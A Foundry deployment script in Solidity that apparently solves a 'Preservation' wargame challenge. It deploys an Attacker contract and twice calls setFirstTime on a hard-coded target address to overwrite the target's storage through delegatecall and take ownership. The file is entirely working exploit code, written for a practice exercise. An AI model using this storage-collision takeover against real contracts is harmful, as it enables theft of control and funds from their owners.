// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Attacker} from "../src/Attacker.sol";

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
}
contract AttackerScript is Script {

    IPreservation target;
    function setUp() public {
        target = IPreservation(0x4FE84C095C5EC45ab751FC7e39019A7C3D0b3827);
    }

    function run() public {
        vm.startBroadcast();

        Attacker attacker = new Attacker();
        target.setFirstTime(uint160(address(attacker)));
        target.setFirstTime(uint160(msg.sender));

        vm.stopBroadcast();
    }
}
